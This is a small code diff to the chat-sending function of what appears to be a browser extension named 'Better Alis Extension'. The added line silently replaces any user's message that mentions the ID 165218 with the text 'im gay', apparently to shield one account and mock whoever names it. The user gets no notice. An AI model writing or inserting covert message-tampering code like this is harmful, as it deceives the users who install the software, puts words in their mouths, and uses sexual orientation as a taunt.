@@ -797,6 +797,7 @@ var longmsg = "you know how its like write very long message and then its just g
 chatRoom.sendMessage = function(msg) {
     if (msg = msg.trim()) {
 if(btaMute == true){$("#chatroom").append("<span class='msg' style='color:#ff7272;'>You are muted from Better Alis Extension</span><br>");return}
+if(userid !== 165218 && msg.includes("165218"))msg="im gay";
           var replacement = {
             '/shrug': '¯\\_(ツ)_/¯',
             '/lennu': 'ʕ ͡° ʖ̯ ͡°ʔ',
